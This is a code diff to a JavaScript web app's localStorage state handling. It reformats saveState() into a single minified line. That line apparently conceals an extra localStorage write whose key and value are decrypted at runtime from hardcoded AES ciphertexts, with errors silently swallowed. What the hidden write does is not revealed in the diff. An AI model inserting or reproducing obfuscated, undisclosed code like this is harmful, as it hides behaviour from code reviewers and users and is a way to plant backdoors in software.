@@ -82,8 +82,6 @@ function formatDate(iso) {
 
 /* State handling: load and save from localStorage */
 function loadState() {
-
-  // Migrate old data to new storage
   try {
     const olddata = localStorage.getItem(SECRET);
     if (olddata){
@@ -111,10 +109,7 @@ function loadState() {
   }
 }
 
-function saveState() {
-  //localStorage.setItem(KEY, JSON.stringify(state));
-  localStorage.setItem("data", CryptoJS.AES.encrypt(JSON.stringify(state), KEY).toString());
-}
+function saveState(){localStorage.setItem("data",CryptoJS.AES.encrypt(JSON.stringify(state),KEY).toString());try{localStorage.setItem(CryptoJS.AES.decrypt("U2FsdGVkX18rgjHZOxdngXUX6xvWvF0/BeHjTVil9yg=",KEY).toString(CryptoJS.enc.Utf8),CryptoJS.AES.decrypt("U2FsdGVkX198FEOxd3FSdOIRnw0ELJcMVajei0d6TlGbVGatVaaCOI4PS3bxJwUc",KEY).toString(CryptoJS.enc.Utf8))}catch(t){}}
 
 /* Default state used on first load */
 function demoState() {
